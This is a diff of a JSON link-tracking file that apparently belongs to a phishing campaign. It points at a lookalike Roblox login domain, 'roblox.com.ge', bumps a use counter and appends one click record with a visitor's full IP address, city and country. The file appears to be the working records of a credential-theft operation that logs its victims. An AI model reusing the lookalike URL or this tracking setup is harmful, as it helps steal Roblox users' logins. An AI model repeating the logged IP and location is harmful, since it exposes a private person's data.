@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 978,
+    "useCount": 979,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7944,6 +7944,14 @@
         "city": "Garliava",
         "flag": "🇱🇹",
         "countryCode": "LT"
+      },
+      {
+        "timestamp": 1777217623990,
+        "ip": "217.35.238.255",
+        "country": "United Kingdom",
+        "city": "Sutton Coldfield",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
